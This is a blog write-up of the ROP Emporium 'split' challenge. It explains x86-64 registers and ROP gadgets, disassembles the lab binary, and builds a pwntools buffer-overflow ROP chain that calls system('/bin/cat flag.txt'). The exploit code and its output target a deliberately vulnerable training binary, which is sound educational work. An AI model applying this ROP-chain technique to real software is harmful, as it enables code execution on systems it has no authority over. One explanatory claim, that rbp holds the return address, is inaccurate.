<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2021-10-10 Sun 16:49 -->
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ROPemporium | Split</title>
<meta name="generator" content="Org mode">
<link rel="stylesheet" type="text/css" href="static/style.css" />
<script type="text/javascript">
// @license magnet:?xt=urn:btih:e95b018ef3580986a04669f1b5879592219e2a7a&dn=public-domain.txt Public Domain
<!--/*--><![CDATA[/*><!--*/
     function CodeHighlightOn(elem, id)
     {
       var target = document.getElementById(id);
       if(null != target) {
         elem.classList.add("code-highlighted");
         target.classList.add("code-highlighted");
       }
     }
     function CodeHighlightOff(elem, id)
     {
       var target = document.getElementById(id);
       if(null != target) {
         elem.classList.remove("code-highlighted");
         target.classList.remove("code-highlighted");
       }
     }
    /*]]>*///-->
// @license-end
</script>
</head>
<body>
<div id="preamble" class="status">
<div class="header">
    <a href="index.html">Home</a>
    <a href="https://github.com/c3lphie">Github</a>
</div>
</div>
<div id="content">
<header>
<h1 class="title">ROPemporium | Split</h1>
</header><nav id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#orged47b43">1. Introduction</a>
<ul>
<li><a href="#org0da731c">1.1. Wtf is a register?</a></li>
<li><a href="#org1c75e1a">1.2. ROP gadgets</a></li>
</ul>
</li>
<li><a href="#orgc810bd4">2. Recon</a>
<ul>
<li><a href="#org4ec5d1e">2.1. File</a></li>
<li><a href="#orgd40e9c5">2.2. Checksec</a></li>
<li><a href="#org4fb08d3">2.3. Static analysis</a>
<ul>
<li><a href="#org1c86ab1">2.3.1. Strings</a></li>
<li><a href="#org913d9da">2.3.2. Main function</a></li>
<li><a href="#org4dacba0">2.3.3. pwnme function</a></li>
<li><a href="#org8ba14c9">2.3.4. usefulFunction</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orge6ac07c">3. Exploitation</a>
<ul>
<li><a href="#org776cd60">3.1. Buffer overflow</a></li>
<li><a href="#orgf6d1aef">3.2. Finding gadgets</a></li>
<li><a href="#org3a4b1f8">3.3. Creating the chain</a></li>
<li><a href="#org925bbd6">3.4. Final exploit</a></li>
</ul>
</li>
<li><a href="#org3736ea2">4. Conclusions</a></li>
</ul>
</div>
</nav>

<div id="outline-container-orged47b43" class="outline-2">
<h2 id="orged47b43"><span class="section-number-2">1</span> Introduction</h2>
<div class="outline-text-2" id="text-1">
<p>
Welcome to my write-up for the second challenge on <a href="https://ropemporium.com">ROPemporium</a>, called <code>split</code>.
This challenge is almost the same as the previous challenge, <code>ret2win</code> which I've covered in this post <a href="https://c3lphie.com/2021-03-22-ropemporium-ret2win.html">ROPemporium | ret2win</a>, but adds a little twist to increase the difficulty.
</p>

<p>
But before I get to that, there is some prerequisite knowledge that is necessary to understand before we can complete this challenge.
We need to understand what registers are, and how we can use them to our advantage.
Then there is also the concept of ROPgadgets, which is the main element of return oriented programming.
</p>
</div>
<div id="outline-container-org0da731c" class="outline-3">
<h3 id="org0da731c"><span class="section-number-3">1.1</span> Wtf is a register?</h3>
<div class="outline-text-3" id="text-1-1">
<p>
In my last post I briefly mentioned that through the manipulation of registers we could execute arbitrary code.
And we also proved that in fact could control what was executed next.
</p>

<p>
But there's a lot more power in the registers when doing ROP.
</p>

<p>
Like last time, let us look at what <a href="https://en.wikipedia.org/wiki/Processor_register">Wikipedia</a> has to say:
</p>
<blockquote>
<p>
A processor register is a quickly accessible location available to a computer's processor. Registers usually consist of a small amount of fast storage, although some registers have specific hardware functions, and may be read-only or write-only.
</p>
</blockquote>

<p>
The way registers are implemented, the number of them, their size and how they are utilized can differ a lot between the different architectures.
So I'll try and write as generally as I can, but my main focus will be on the x64 because it is very widespread and the one i currently use.
</p>

<table>
<caption class="t-above"><span class="table-number">Table 1:</span> 64- and 32-bit register overview (Source: <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x64-architecture">x64 Architecture - Microsoft</a> and <a href="https://wiki.osdev.org/CPU_Registers_x86-64">CPU Registers x86-64 - OSDev</a>)</caption>

<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">64-bit</th>
<th scope="col" class="org-left">32-bit</th>
<th scope="col" class="org-left">Short description</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">rip</td>
<td class="org-left">eip</td>
<td class="org-left">Instruction Pointer</td>
</tr>

<tr>
<td class="org-left">rax</td>
<td class="org-left">eax</td>
<td class="org-left">Accumulator</td>
</tr>

<tr>
<td class="org-left">rbx</td>
<td class="org-left">ebx</td>
<td class="org-left">Base</td>
</tr>

<tr>
<td class="org-left">rcx</td>
<td class="org-left">ecx</td>
<td class="org-left">Counter</td>
</tr>

<tr>
<td class="org-left">rdx</td>
<td class="org-left">edx</td>
<td class="org-left">Data (commonly extends A regs)</td>
</tr>

<tr>
<td class="org-left">rsi</td>
<td class="org-left">esi</td>
<td class="org-left">Source Index for string operations</td>
</tr>

<tr>
<td class="org-left">rdi</td>
<td class="org-left">edi</td>
<td class="org-left">Destination index for string operations</td>
</tr>

<tr>
<td class="org-left">rbp</td>
<td class="org-left">ebp</td>
<td class="org-left">Base pointer</td>
</tr>

<tr>
<td class="org-left">rsp</td>
<td class="org-left">esp</td>
<td class="org-left">Stack pointer</td>
</tr>

<tr>
<td class="org-left">r8</td>
<td class="org-left">r8d</td>
<td class="org-left">General purpose</td>
</tr>

<tr>
<td class="org-left">r9</td>
<td class="org-left">r9d</td>
<td class="org-left">General purpose</td>
</tr>

<tr>
<td class="org-left">r10</td>
<td class="org-left">r10d</td>
<td class="org-left">General purpose</td>
</tr>

<tr>
<td class="org-left">r11</td>
<td class="org-left">r11d</td>
<td class="org-left">General purpose</td>
</tr>

<tr>
<td class="org-left">r12</td>
<td class="org-left">r12d</td>
<td class="org-left">General purpose</td>
</tr>

<tr>
<td class="org-left">r13</td>
<td class="org-left">r13d</td>
<td class="org-left">General purpose</td>
</tr>

<tr>
<td class="org-left">r14</td>
<td class="org-left">r14d</td>
<td class="org-left">General purpose</td>
</tr>

<tr>
<td class="org-left">r15</td>
<td class="org-left">r15d</td>
<td class="org-left">General purpose</td>
</tr>
</tbody>
</table>

<p>
I would also like to point out that there are more registers in a processor than those you see here, these are just the ones we have access to.
</p>

<p>
The first register is a special register, that is used to indicate where the computer is in the program sequence.
</p>

<p>
The rest is general purpose, but as you can see on the table, there are some that are used for special things.
That is however only according to calling conventions, which most software sticks to.
</p>

<p>
The ones we are most interested in when doing ROP are:
</p>
<dl class="org-dl">
<dt>rbp</dt><dd>As we learned last <a href="https://c3lphie.com/2021-03-22-ropemporium-ret2win.html">post</a>, this is register holds the return address of the function.</dd>
<dt>rsp</dt><dd>The stack pointer, it points to addresses in the stack.</dd>
<dt>rax</dt><dd>Holds the return value of a function.</dd>
<dt>rdi, rsi, rdx</dt><dd>Usually used for storing function parameter values.</dd>
</dl>

<p>
An amazing tool to see which registers are used for what function parameters for linux libc follow <a href="https://filippo.io/linux-syscall-table/">this link</a>.
</p>
</div>
</div>

<div id="outline-container-org1c75e1a" class="outline-3">
<h3 id="org1c75e1a"><span class="section-number-3">1.2</span> ROP gadgets</h3>
<div class="outline-text-3" id="text-1-2">
<p>
According to the paper <a href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">Return-Oriented-Programming (ROP FTW)</a>, ROP gadgets are small instruction sequences that end in a <code>ret</code> instruction or <code>0xc3</code> if looking at a hexdump of a binary.
</p>

<p>
(Btw, I can highly recommend reading this paper if you're interested in ROP)
</p>

<p>
The reason for these gadgets needing to end with a <code>ret</code> instruction, is to allow the creation of a chain of gadgets.
</p>

<p>
When trying to find these gadgets the following algorithm can be used:
</p>
<ol class="org-ol">
<li>Search the binary for all <code>ret</code> bytes</li>
<li>Go back and see if previous byte contains a valid instruction. Do this for up do 20 bytes</li>
<li>Record all valid instruction sequences found in the binary or linked libraries.</li>
</ol>

<p>
Fortunalety there are already tools made for this:
</p>
<ul class="org-ul">
<li><a href="https://github.com/sashs/Ropper">https://github.com/sashs/Ropper</a></li>
<li><a href="https://github.com/JonathanSalwan/ROPgadget">https://github.com/JonathanSalwan/ROPgadget</a></li>
</ul>

<p>
I use <code>ropper</code>, but I think <code>ROPgadget</code> will do just as good a job.
</p>

<p>
The paper, linked above, describes five uses for gadgets:
</p>
<ul class="org-ul">
<li>Load constant into register</li>
<li>Load from memory</li>
<li>Storing into memory</li>
<li>Arithmetics</li>
<li>System calls</li>
</ul>

<p>
The gadgets functionality depends on what intruction it starts with.
If the gadget starts with <code>pop</code> or <code>push</code>, they can be used to manipulate registers, where gadgets starting with the <code>call</code> instruction is used to make system calls.
</p>

<p>
These two types of gadgets are the ones you will need to find in order to complete this challenge.
</p>
</div>
</div>
</div>
<div id="outline-container-orgc810bd4" class="outline-2">
<h2 id="orgc810bd4"><span class="section-number-2">2</span> Recon</h2>
<div class="outline-text-2" id="text-2">
<p>
Again before I do any actual exploitation, I'll try to gather as much information as possible about the target.
I know that I'm kinda repeating my self, but research is important.
And you need to have a better understanding of how the software works than the guy/gal that wrote the software.
At least to some degree, no one is omniscient(as far as i know atleast), and that is okay.
</p>

<p>
The most important thing in this case is that we learn about ROP so recon is minimal in this case.
</p>
</div>
<div id="outline-container-org4ec5d1e" class="outline-3">
<h3 id="org4ec5d1e"><span class="section-number-3">2.1</span> File</h3>
<div class="outline-text-3" id="text-2-1">
<p>
The output here is exactly the same as last post, except for the name of the binary.
But I'll keep it here for good measure.
</p>
<pre class="example" id="org5cc5719">
┌────[~/ha/bi/ropemporium/split on  master [?]
└─&gt;file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
</pre>
</div>
</div>
<div id="outline-container-orgd40e9c5" class="outline-3">
<h3 id="orgd40e9c5"><span class="section-number-3">2.2</span> Checksec</h3>
<div class="outline-text-3" id="text-2-2">
<p>
Same situation for <code>checksec</code>'s output, if you need a refresher read my <a href="https://c3lphie.com/2021-03-22-ropemporium-ret2win.html">last post</a>.
</p>
<pre class="example" id="org745f0bf">
┌────[~/ha/bi/ropemporium/split on  master [?]
└─&gt;checksec split
[*] '/home/c3lphie/hacking/binary_exploitation/ropemporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre>
</div>
</div>
<div id="outline-container-org4fb08d3" class="outline-3">
<h3 id="org4fb08d3"><span class="section-number-3">2.3</span> Static analysis</h3>
<div class="outline-text-3" id="text-2-3">
<p>
Once again we go through static analysis of the binary before we begin our exploit.
</p>
</div>

<div id="outline-container-org1c86ab1" class="outline-4">
<h4 id="org1c86ab1"><span class="section-number-4">2.3.1</span> Strings</h4>
<div class="outline-text-4" id="text-2-3-1">
<p>
First thing we should do, that I didn't last time, is to look at the strings in the binary.
Because they might give us some usefull information, or clues as to how this challenge should be completed.
</p>

<p>
This is also often the case in CTF challenges.
</p>

<figure id="orgf372eb8">
<img src="assets/split_strings.png" alt="split_strings.png">

<figcaption><span class="figure-number">Figure 1: </span>Strings with memory addresses found in Binary Ninja</figcaption>
</figure>

<p>
And if I could point your attention to the last string, you'll see the <code>/bin/cat flag.txt</code>, which we will need for our exploit.
</p>

<p>
So let's note down that adress <code>0x00601060</code> for future use!
</p>
</div>
</div>
<div id="outline-container-org913d9da" class="outline-4">
<h4 id="org913d9da"><span class="section-number-4">2.3.2</span> Main function</h4>
<div class="outline-text-4" id="text-2-3-2">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 1: </span>main function dissasembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
mov     rbp, rsp {__saved_rbp}
mov     rax, qword [rel stdout]
mov     ecx, 0x0
mov     edx, 0x2
mov     esi, 0x0
mov     rdi, rax
call    setvbuf
mov     edi, 0x4007e8  {"split by ROP Emporium"}
call    puts
mov     edi, 0x4007fe  {"x86_64\n"}
call    puts
mov     eax, 0x0
call    pwnme
mov     edi, 0x400806  {"\nExiting"}
call    puts
mov     eax, 0x0
pop     rbp {__saved_rbp}
retn     {__return_addr}
</pre>
</div>
<p>
Again like in my last post, there is not that much of interest here, except for the <code>call</code> for the <code>pwnme</code> function.
Which again the main focus of for exploitation.
</p>
</div>
</div>
<div id="outline-container-org4dacba0" class="outline-4">
<h4 id="org4dacba0"><span class="section-number-4">2.3.3</span> pwnme function</h4>
<div class="outline-text-4" id="text-2-3-3">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 2: </span>pwnme function disassembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
mov     rbp, rsp {__saved_rbp}
sub     rsp, 0x20
lea     rax, [rbp-0x20 {buffer}]
mov     edx, 0x20
mov     esi, 0x0
mov     rdi, rax {buffer}
call    memset
mov     edi, 0x400810  {"Contriving a reason to ask user …"}
call    puts
mov     edi, 0x40083c
mov     eax, 0x0
call    printf
lea     rax, [rbp-0x20 {buffer}]
mov     edx, 0x60
mov     rsi, rax {buffer}
mov     edi, 0x0
call    read
mov     edi, 0x40083f  {"Thank you!"}
call    puts
nop     
leave    {__saved_rbp}
retn     {__return_addr}
</pre>
</div>
<p>
Instead of just focusing on the HLIL version of the function, like last time, this time we're going to compare the two versions to get a better understanding of how assembly works.
</p>
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 3: </span>pwnme function HLIL</label><pre class="src src-c">void buffer
memset(&amp;buffer, 0, 32)
puts(str: "Contriving a reason to ask user …")
printf(format: data_40083c)
read(fd: 0, buf: &amp;buffer, nbytes: 96)
return puts(str: "Thank you!")
</pre>
</div>
<p>
And as you can see in both examples I already cleaned them up a bit, just so it's easier to understand.
</p>

<p>
<img src="assets/split_pwn_disass_hlil.png" alt="split_pwn_disass_hlil.png">
Here is a side by side comparison between the to versions.
First we create the variabel <code>buffer</code>, which is then initialized with <code>memset</code>.
The three <code>mov</code> instructions above <code>memset</code> prepares the arguments by moving the values into the corresponding registers.
It fills 32 bytes with zero's starting at the address of <code>buffer</code>.
</p>

<p>
This method of preparing the registers before the <code>call</code> instructions is, as you can see, how function arguments are set down at this level.
</p>

<p>
Anyway, just before the <code>read</code> call, the arguments are set.
<code>edx</code> gets the value <code>0x60</code> which in decimal is 96, which is the max amount of bytes the <code>read</code> function will accept.
<code>rsi</code> is then set to <code>rax</code> which acts as the buffer variable.
</p>

<p>
So what happens here is that first the 32 bytes are allocated as <code>0x0</code> with <code>memset</code>, then down at <code>read</code> we can suddenly write up to 96 bytes with whatever data that we wan't.
The fact that we can write more information into the buffer than was allocated at first, means that we have a buffer overflow.
</p>
</div>
</div>
<div id="outline-container-org8ba14c9" class="outline-4">
<h4 id="org8ba14c9"><span class="section-number-4">2.3.4</span> usefulFunction</h4>
<div class="outline-text-4" id="text-2-3-4">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 4: </span>usefulFunction disassembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
mov     rbp, rsp {__saved_rbp}
mov     edi, 0x40084a  {"/bin/ls"}
call    system
nop     
pop     rbp {__saved_rbp}
retn     {__return_addr}
</pre>
</div>
<p>
So taking what we learned in <a href="#org4dacba0">pwnme function</a> about how arguments are prepared for functions in assembly, we see that the address for the string "/bin/ls" is moved into the <code>edi</code> register before calling <code>system</code>.
</p>

<p>
This function isn't actually called in the binary, so it is only here for us to use in our exploit.
Since we don't want to run "/bin/ls" but "/bin/cat flag.txt", we can just grab the address for the <code>call</code> instruction.
Like the <code>usefulData</code> string I grabbed the address (<code>0x40074b</code>) from binary ninja and noted it down.
</p>

<p>
We'll need it later in our first ROP chain.
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orge6ac07c" class="outline-2">
<h2 id="orge6ac07c"><span class="section-number-2">3</span> Exploitation</h2>
<div class="outline-text-2" id="text-3">
<p>
Now we are ready to begin exploiting the binary!
I won't go as much into detail about the buffer overflow, it is the exact same procedure as last time.
</p>
</div>
<div id="outline-container-org776cd60" class="outline-3">
<h3 id="org776cd60"><span class="section-number-3">3.1</span> Buffer overflow</h3>
<div class="outline-text-3" id="text-3-1">
<p>
A quick recap of finding a basic buffer overflow.
</p>

<p>
I start with a basic template as you can see below.
</p>
<div class="org-src-container">
<pre class="src src-python">from pwn import *

context.update(arch="amd64", os="linux")
proc = process("./split")
gdb.attach(proc, """
break main
""")

def send_recv(buffer: bytes):
    proc.recvuntil("&gt;")
    proc.send(buffer)

payload = cyclic(100)

send_recv(payload)
proc.interactive()
</pre>
</div>
<p>
Running this helps you find where base pointer is located on the stack.
I found the offset the be at <code>0x6161616b</code> in the cyclic sequence, so I used <code>cyclic_find(0x6161616b)</code> to calculate my padding.
</p>

<p>
The following exploit returns into <code>usefulFunction</code>
</p>
<div class="org-src-container">
<pre class="src src-python">from pwn import *

context.update(arch="amd64", os="linux")
proc = process("./split")
# gdb.attach(proc, """
# break main
# """)

def send_recv(buffer: bytes):
    proc.recvuntil("&gt;")
    proc.send(buffer)

payload = cyclic(cyclic_find(0x6161616b))
payload += p64(0x400742)

send_recv(payload)
proc.interactive()
</pre>
</div>
<p>
Which calls <code>/bin/ls</code>:
</p>
<pre class="example" id="orgfec9d26">
┌────[~/ha/bi/ropemporium/split on  master [?]
└─&gt;python exploit.py
[+] Starting local process './split': pid 384887
[*] Switching to interactive mode
 Thank you!
exploit.py  exploit.py~  flag.txt  README.org  README.org~  split  split.bndb
[*] Got EOF while reading in interactive
$
</pre>

<p>
So let find our first gadget!
</p>
</div>
</div>
<div id="outline-container-orgf6d1aef" class="outline-3">
<h3 id="orgf6d1aef"><span class="section-number-3">3.2</span> Finding gadgets</h3>
<div class="outline-text-3" id="text-3-2">
<p>
As mentioned earlier I'll be using <code>ropper</code> to find the ROP gadgets needed for this exploit.
</p>

<p>
In fact we only need one gadget for this ROP chain since we already have a <code>system</code> call.
So what we need to do is find a gadget that can <code>pop</code> an address into a register from the stack.
</p>
<pre class="example" id="org52d5783">
┌────[~/ha/bi/ropemporium/split on  master [?]
└─&gt;ropper -f split --console
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
(split/ELF/x86_64)&gt;

</pre>
<p>
I use the <code>--console</code> flag because it loads the entire binary once, which makes multiple searches faster.
Now all we gotta do is search for gadgets starting with a <code>pop</code> instruction.
</p>
<pre class="example" id="orgba0201e">
(split/ELF/x86_64)&gt; search pop
[INFO] Searching for gadgets: pop

[INFO] File: split
0x00000000004007bc: pop r12; pop r13; pop r14; pop r15; ret;
0x00000000004007be: pop r13; pop r14; pop r15; ret;
0x00000000004007c0: pop r14; pop r15; ret;
0x00000000004007c2: pop r15; ret;
0x000000000040060b: pop rbp; mov edi, 0x601078; jmp rax;
0x00000000004007bb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x00000000004007bf: pop rbp; pop r14; pop r15; ret;
0x0000000000400618: pop rbp; ret;
0x00000000004007c3: pop rdi; ret;
0x00000000004007c1: pop rsi; pop r15; ret;
0x00000000004007bd: pop rsp; pop r13; pop r14; pop r15; ret;

</pre>
<p>
As you can see we have quite the list of candidates!
</p>

<p>
But why <code>pop</code> well, the instruction takes the element from the stack that the stack pointer points at, and puts it into the register coming after.
And since we have control of the stack elements, we can control the registers that we have <code>pop</code> gadgets for.
</p>

<p>
So which register do we want to <code>pop</code>
Well the first argument is often the <code>rdi</code> register, so the gadget we're gonna use is: <code>0x00000000004007c3: pop rdi; ret;</code>
</p>

<p>
And just take a note of that address.
</p>
</div>
</div>
<div id="outline-container-org3a4b1f8" class="outline-3">
<h3 id="org3a4b1f8"><span class="section-number-3">3.3</span> Creating the chain</h3>
<div class="outline-text-3" id="text-3-3">
<ul class="org-ul">
<li>State "DONE"       from "NEXT"       <span class="timestamp-wrapper"><span class="timestamp">[2021-04-09 Fri 17:21]</span></span></li>
</ul>
<table>
<caption class="t-above"><span class="table-number">Table 2:</span> All the useful adresses we have collected</caption>

<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Name</th>
<th scope="col" class="org-left">Adress</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">system</td>
<td class="org-left"><code>0x40074b</code></td>
</tr>

<tr>
<td class="org-left">usefulData</td>
<td class="org-left"><code>0x601060</code></td>
</tr>

<tr>
<td class="org-left">popRdi</td>
<td class="org-left"><code>0x4007c3</code></td>
</tr>
</tbody>
</table>

<p>
Above you'll se the list of addresses we have collected so far.
All we have to do now is chain it together!
</p>

<div class="org-src-container">
<pre class="src src-python">from pwn import *

...

popRdi = p64(0x4007c3)
system = p64(0x40074b)
usefulData = p64(0x601060)

payload = cyclic(cyclic_find(0x6161616b))

send_recv(payload)

proc.interactive()
</pre>
</div>
<p>
In the same python file from the <a href="#org776cd60">Buffer overflow</a> section, I assigned the adresses as variables.
Then I simply add them in an order which chains them together (see were the name came from ;)).
</p>

<p>
But which order?
Well we should of course use the same order as it's done in assembly!
</p>
<div class="org-src-container">
<pre class="src src-python">from pwn import *

...

popRdi = p64(0x4007c3)
system = p64(0x40074b)
usefulData = p64(0x601060)

payload = cyclic(cyclic_find(0x6161616b))
payload += popRdi
payload += usefulData
payload += system

send_recv(payload)

proc.interactive()
</pre>
</div>
<p>
First we <code>pop</code> the <code>usefulData</code> address into the <code>rdi</code> register, and then we call <code>system</code>
</p>
</div>
</div>

<div id="outline-container-org925bbd6" class="outline-3">
<h3 id="org925bbd6"><span class="section-number-3">3.4</span> Final exploit</h3>
<div class="outline-text-3" id="text-3-4">
<p>
Here is the final exploit, which will show us the flag.
</p>
<div class="org-src-container">
<pre class="src src-python">from pwn import *

context.update(arch="amd64", os="linux")
proc = process("./split")
# gdb.attach(proc, """
# break main
# """)


def send_recv(buffer: bytes):
    proc.recvuntil("&gt;")
    proc.send(buffer)

popRdi = p64(0x4007c3)
system = p64(0x40074b)
usefulData = p64(0x601060)

payload = cyclic(cyclic_find(0x6161616b))
payload += popRdi
payload += usefulData
payload += system

send_recv(payload)

proc.interactive()
</pre>
</div>

<p>
If we run it in the terminal we get the following flag:
</p>
<pre class="example" id="org9f47cd4">
┌────[~/ha/bi/ropemporium/split on  master [?]
└─&gt;python exploit.py
[+] Starting local process './split': pid 389100
[*] Switching to interactive mode
 Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$

</pre>
<p>
An there you go ladies and gentlemen, we got the flag!
</p>
</div>
</div>
</div>

<div id="outline-container-org3736ea2" class="outline-2">
<h2 id="org3736ea2"><span class="section-number-2">4</span> Conclusions</h2>
<div class="outline-text-2" id="text-4">
<p>
In this post we dove into what registers are and how they are used as parameters for functions in the 64-bit architecture.
We also looked closer at what ROP gadgets are, and how we can use chains of these gadgets to basically reprogram software to do our bidding,
</p>

<p>
Next one in line for this series is ROPemporiums callme challenge, where we'll learn to craft bigger chains without crashing the software afterwards.
</p>
</div>
</div>
</div>
<div id="postamble" class="status">
<div class="footer">
    <div id="copyright">
        <small>&copy; Copyright 2021, C3lphie</small>
    </div>
</div>
</div>
</body>
</html>
